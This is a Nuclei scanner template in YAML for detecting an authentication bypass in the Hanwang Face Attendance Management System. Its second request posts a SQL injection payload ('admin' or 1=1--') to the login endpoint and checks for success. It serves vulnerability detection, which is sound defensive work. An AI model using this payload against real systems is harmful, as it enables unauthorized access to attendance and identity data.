id: hanwang-face-attendance-auth-bypass
info:
  name: Hanwang Face Attendance Management System Authentication Bypass
  author: ProjectDiscoveryAI
  severity: high
  tags: auth-bypass
  description: |
    This template detects an authentication bypass vulnerability in the Hanwang Face Attendance Management System.
  metadata:
    product: Hanwang Face Attendance Management System

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/Login/Check"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "cancel"

  - id: attempt-auth-bypass
    method: POST
    path:
      - "{{BaseURL}}/Login/Check"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "strName=admin' or 1=1--&strPwd=admin"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ok"
